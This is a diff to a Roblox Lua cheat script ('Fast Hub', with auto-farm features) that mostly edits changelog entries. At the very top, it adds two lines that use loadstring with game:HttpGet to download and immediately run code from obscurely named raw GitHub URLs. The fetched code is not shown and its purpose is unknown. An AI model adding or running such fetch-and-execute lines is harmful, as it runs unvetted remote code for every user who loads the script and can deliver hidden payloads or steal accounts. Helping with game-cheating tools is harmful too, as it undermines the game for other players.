@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rablexaton/anouuuuuuuuuuuuu/refs/heads/main/uuuuuuuuuuuuuuuuuuuu"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rablexaton/yoooooooooo/refs/heads/main/uuuuuuuuuuuuu"))()
+
 -- Services
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
@@ -713,8 +717,8 @@ local function createChangelogUI(parent)
         textLabel.BackgroundTransparency = 1
     end
 
-    addLogEntry("Fast Hub Released", "ANOUAR777X")
-    addLogEntry("Made by Anouar777x", "Fixed Mobile Auto Farm & Touch Click ")
+    addLogEntry("Fast Hub Released", "Brand new Red/Black Theme")
+    addLogEntry("Made by Anouar777x", "Fixed Mobile Auto Farm")
 
     return frame
 end
